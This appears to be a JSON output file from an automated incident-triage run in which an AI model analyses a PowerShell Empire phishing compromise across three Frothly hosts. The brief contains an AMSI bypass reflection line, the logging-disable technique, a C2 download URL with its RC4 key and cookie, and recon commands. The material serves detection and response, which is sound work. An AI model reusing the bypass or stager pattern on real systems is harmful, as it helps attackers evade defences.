@@ -1,0 +1,227 @@
+{
+  "run_id": "20260524T200934Z-BSTOLL-L",
+  "received_at": "2026-05-24T20:09:34Z",
+  "search_name": "Ops Narrator - Encoded PowerShell Beachhead",
+  "alert": {
+    "time": "2018-08-20 05:59:48 EDT",
+    "host": "BSTOLL-L",
+    "account": "BudStoll",
+    "event_code": "4688",
+    "command_line": "\"...powershell.exe\" powershell -noP -sta -w 1 -enc SQBmACg..."
+  },
+  "stop_reason": "finalized",
+  "iterations": 3,
+  "elapsed_sec": 242.3,
+  "provider": "anthropic",
+  "model": "claude-opus-4-7",
+  "trace_path": "traces/trace-20260524-200934-BSTOLL-L.jsonl",
+  "tool_calls": [
+    {
+      "name": "decode_payload",
+      "latency_ms": 1,
+      "row_count": null,
+      "is_error": false
+    },
+    {
+      "name": "find_process_ancestry",
+      "latency_ms": 1809,
+      "row_count": 500,
+      "is_error": false
+    },
+    {
+      "name": "decode_payload",
+      "latency_ms": 1,
+      "row_count": null,
+      "is_error": false
+    },
+    {
+      "name": "find_pattern_across_hosts",
+      "latency_ms": 1181,
+      "row_count": 3,
+      "is_error": false
+    },
+    {
+      "name": "finalize_brief",
+      "latency_ms": 0,
+      "row_count": null,
+      "is_error": false
+    }
+  ],
+  "brief": {
+    "severity": "P2",
+    "headline": "PowerShell Empire stager via malicious SharePoint .lnk hit 3 Frothly users (BudStoll, FyodorMalteskesko, AlBungstein) beaconing to 45.77.53.176; AMSI and ScriptBlock logging disabled on initial host.",
+    "summary": "On 2018-08-20 ~05:28 CST, user BudStoll on BSTOLL-L opened a malicious shortcut 'BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk' downloaded via Microsoft Edge from frothly-my.sharepoint.com (path /personal/bgist_froth_ly/Documents/Birthday Pictures/BRUCE BIRTHDAY HAPPY HOUR PICS.lnk). browser_broker.exe spawned a Base64-encoded PowerShell one-liner (-noP -sta -w 1 -enc ...). Decoded, it is a textbook Empire stager: it patches System.Management.Automation.Utils cachedGroupPolicySettings to disable ScriptBlockLogging, sets AmsiUtils.amsiInitFailed=true (AMSI bypass), and zeroes the ScriptBlock signatures HashSet. It then RC4-decrypts (key '1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP') a payload downloaded from https://45.77.53.176:443/admin/get.php with cookie 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=' using IE11 UA, and IEX-executes it. The same -enc pattern next appeared on FYODOR-L (FyodorMalteskesko) ~05:32 CST and ABUNGST-L (AlBungstein) ~05:57 CST \u2014 indicating the same lure/Empire campaign reached 3 users. On BSTOLL-L, post-exec recon was observed (netstat -nao | findstr LISTENING, wmic os get LocalDateTime, reg query HKLM\\...\\Uninstall\\* enumeration) consistent with Empire situational-awareness modules. No clear lateral pivot via WMI/PSRemoting was observed in the window, and the activity appears to be parallel user compromises rather than host-to-host movement.",
+    "findings": [
+      {
+        "title": "Empire PowerShell stager launched from Edge browser_broker on BSTOLL-L",
+        "evidence": "BSTOLL-L 2018-08-20 05:28:40 CST EID 4688: browser_broker.exe -> powershell.exe with '-noP -sta -w 1 -enc <base64>'. Immediately preceded by browser_broker.exe -IOAVHost referencing C:\\Users\\BudStoll\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk and https://frothly-my.sharepoint.com/personal/bgist_froth_ly/Documents/Birthday%20Pictures/BRUCE%20BIRTHDAY%20HAPPY%20HOUR%20PICS.lnk.",
+        "iocs": [
+          "BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk",
+          "https://frothly-my.sharepoint.com/personal/bgist_froth_ly/Documents/Birthday%20Pictures/BRUCE%20BIRTHDAY%20HAPPY%20HOUR%20PICS.lnk"
+        ],
+        "mitre": [
+          "T1566.002 Phishing: Spearphishing Link",
+          "T1204.002 User Execution: Malicious File",
+          "T1059.001 PowerShell",
+          "T1027 Obfuscated Files or Information"
+        ]
+      },
+      {
+        "title": "Defense evasion: AMSI bypass + ScriptBlock logging disabled",
+        "evidence": "Decoded -enc payload sets [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) and zeroes cachedGroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging']/['EnableScriptBlockInvocationLogging'] and ScriptBlock.signatures HashSet.",
+        "iocs": [
+          "amsiInitFailed",
+          "EnableScriptBlockLogging=0"
+        ],
+        "mitre": [
+          "T1562.001 Impair Defenses: Disable or Modify Tools",
+          "T1562.006 Indicator Blocking"
+        ]
+      },
+      {
+        "title": "C2 beacon: HTTPS to 45.77.53.176/admin/get.php with RC4 staged payload",
+        "evidence": "Decoded stager DownloadData($ser+'/admin/get.php') where $ser=base64-decoded 'https://45.77.53.176:443'; UA 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; Cookie 'PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI='; RC4 key '1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP'; cert validation callback set to {$true}; result IEX-executed.",
+        "iocs": [
+          "https://45.77.53.176:443/admin/get.php",
+          "45.77.53.176",
+          "Cookie: PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=",
+          "RC4 key: 1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP",
+          "UA: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+        ],
+        "mitre": [
+          "T1071.001 Application Layer Protocol: Web",
+          "T1573.001 Encrypted Channel: Symmetric Cryptography",
+          "T1105 Ingress Tool Transfer"
+        ]
+      },
+      {
+        "title": "Post-exploitation host reconnaissance on BSTOLL-L",
+        "evidence": "After the PS launch, repeated cmd.exe spawned netstat -nao | findstr LISTENING, wmic os get LocalDateTime /value, and dozens of reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* entries (05:43 and 07:25-07:36 CST) \u2014 typical Empire Situational_Awareness output.",
+        "iocs": [
+          "netstat -nao | findstr LISTENING",
+          "wmic os get LocalDateTime /value",
+          "reg query HKLM\\...\\Uninstall\\*"
+        ],
+        "mitre": [
+          "T1049 System Network Connections Discovery",
+          "T1012 Query Registry",
+          "T1518 Software Discovery"
+        ]
+      },
+      {
+        "title": "Campaign hit at least three users in parallel",
+        "evidence": "EID 4688 with powershell -enc pattern: BSTOLL-L/BudStoll first 05:28:40 CST, FYODOR-L/FyodorMalteskesko first 05:32:12 CST, ABUNGST-L/AlBungstein first 05:57:15 CST (epoch first_seen 1534764520/1534764732/1534766235).",
+        "iocs": [
+          "BSTOLL-L",
+          "FYODOR-L",
+          "ABUNGST-L",
+          "BudStoll",
+          "FyodorMalteskesko",
+          "AlBungstein"
+        ],
+        "mitre": [
+          "T1566.002 Phishing: Spearphishing Link"
+        ]
+      }
+    ],
+    "timeline": [
+      {
+        "time": "2018-08-20 05:28:40 CST",
+        "host": "BSTOLL-L",
+        "event": "Edge browser_broker.exe processes BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk from frothly-my.sharepoint.com and spawns powershell.exe -enc Empire stager (BudStoll)."
+      },
+      {
+        "time": "2018-08-20 05:28:40 CST",
+        "host": "BSTOLL-L",
+        "event": "Stager disables AMSI/ScriptBlockLogging, fetches https://45.77.53.176:443/admin/get.php, RC4-decrypts and IEX-executes payload."
+      },
+      {
+        "time": "2018-08-20 05:32:12 CST",
+        "host": "FYODOR-L",
+        "event": "Same powershell -enc pattern executed by FyodorMalteskesko."
+      },
+      {
+        "time": "2018-08-20 05:43:08 CST",
+        "host": "BSTOLL-L",
+        "event": "Recon: netstat -nao | findstr LISTENING; wmic os get LocalDateTime."
+      },
+      {
+        "time": "2018-08-20 05:57:15 CST",
+        "host": "ABUNGST-L",
+        "event": "Same powershell -enc pattern executed by AlBungstein."
+      },
+      {
+        "time": "2018-08-20 07:25-07:36 CST",
+        "host": "BSTOLL-L",
+        "event": "Extensive HKLM Uninstall registry enumeration and repeated netstat/wmic recon."
+      }
+    ],
+    "iocs": {
+      "ipv4": [
+        "45.77.53.176"
+      ],
+      "urls": [
+        "https://45.77.53.176:443/admin/get.php"
+      ],
+      "domains": [
+        "frothly-my.sharepoint.com"
+      ],
+      "files": [
+        "BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk",
+        "C:\\Users\\BudStoll\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\BRUCE BIRTHDAY HAPPY HOUR PICS (4).lnk"
+      ],
+      "cookies": [
+        "PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI="
+      ],
+      "user_agents": [
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+      ],
+      "keys": [
+        "RC4: 1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP"
+      ],
+      "hosts": [
+        "BSTOLL-L",
+        "FYODOR-L",
+        "ABUNGST-L"
+      ],
+      "accounts": [
+        "BudStoll",
+        "FyodorMalteskesko",
+        "AlBungstein"
+      ],
+      "tools": [
+        "PowerShell Empire stager (Invoke-Empire launcher)"
+      ]
+    },
+    "scope": {
+      "hosts": [
+        "BSTOLL-L",
+        "FYODOR-L",
+        "ABUNGST-L"
+      ],
+      "accounts": [
+        "BudStoll",
+        "FyodorMalteskesko",
+        "AlBungstein"
+      ],
+      "stage": "Initial access via spearphishing link -> User execution -> Defense evasion (AMSI/SBL bypass) -> C2 (Empire) -> Discovery"
+    },
+    "gaps": [
+      "Second-stage payload returned from /admin/get.php was not retrievable from logs (encrypted/in-memory IEX); actual capabilities inferred from Empire's standard agent.",
+      "ScriptBlock logging was actively disabled on the compromised hosts, so further PowerShell activity is largely blind.",
+      "Network telemetry (proxy/firewall) for outbound connections to 45.77.53.176 was not queried \u2014 duration/volume of C2 unknown.",
+      "Whether credentials/tokens were harvested or lateral movement attempted after stager success on FYODOR-L/ABUNGST-L was not verified beyond the initial -enc execution.",
+      "Source of the malicious .lnk in the SharePoint tenant (which account uploaded it) was not investigated."
+    ],
+    "recommended_containment": [
+      "Isolate BSTOLL-L, FYODOR-L, ABUNGST-L from network; collect memory before reboot to capture in-memory Empire agent.",
+      "Force password reset + revoke active sessions/tokens for BudStoll, FyodorMalteskesko, AlBungstein (incl. Azure AD/Office 365).",
+      "Block egress to 45.77.53.176 at perimeter and add IDS signatures for URI '/admin/get.php' + cookie 'PthAVgs='.",
+      "Remove BRUCE BIRTHDAY HAPPY HOUR PICS.lnk from frothly-my.sharepoint.com under bgist_froth_ly; audit that account (likely compromised distribution point) and review who downloaded the file.",
+      "Hunt across the fleet for: powershell.exe -enc parents = browser_broker.exe / Office apps; outbound to 45.77.53.176; UA 'Trident/7.0; rv:11.0' from powershell; cookie 'PthAVgs='; cleared/disabled ScriptBlockLogging GPO in-memory.",
+      "Re-enable and centrally collect PowerShell ScriptBlock + Module logging via GPO; ensure AMSI providers are functional; deploy Defender ASR rule 'Block all Office apps from creating child processes' and consider blocking PowerShell launches from browser_broker.exe.",
+      "Once contained, rebuild the three endpoints from known-good images rather than clean-in-place."
+    ]
+  },
+  "error": null
+}
